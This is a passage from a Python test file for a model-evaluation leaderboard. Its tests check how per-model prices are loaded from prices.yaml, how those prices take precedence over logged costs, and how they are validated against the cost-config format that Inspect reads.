    assert cost_per_1k(log, prices) == 2.0, "prices.yaml wins, so a corrected price reaches older runs"
    assert cost_per_1k(log, {}) == 5.0, "a model missing from prices.yaml uses the cost its log recorded"


def test_a_price_without_cache_prices_gets_a_plain_message(tmp_path: Path, monkeypatch: Any):
    # pricing pages often list only input and output, and Inspect needs all four
    prices = tmp_path / "prices.yaml"
    prices.write_text("openai/gpt-6-luna: {input: 0.10, output: 0.50}\n", encoding="utf-8")
    monkeypatch.setattr("leaderboard.results.PRICES", prices)
    with pytest.raises(ValueError, match="prices.yaml: openai/gpt-6-luna needs input_cache_write, input_cache_read"):
        load_prices()


def test_prices_yaml_is_in_the_format_inspect_reads():
    prices = load_prices()
    assert prices, "prices.yaml has at least one model, each with input, output and cache prices"
    # Inspect stops every run if its --model-cost-config lists a model it doesn't know
    unknown = [model for model in prices if get_model_info(model) is None]
    assert not unknown, (
        f"Inspect doesn't know {unknown}. Remove them from prices.yaml, or register them with set_model_info()"
    )
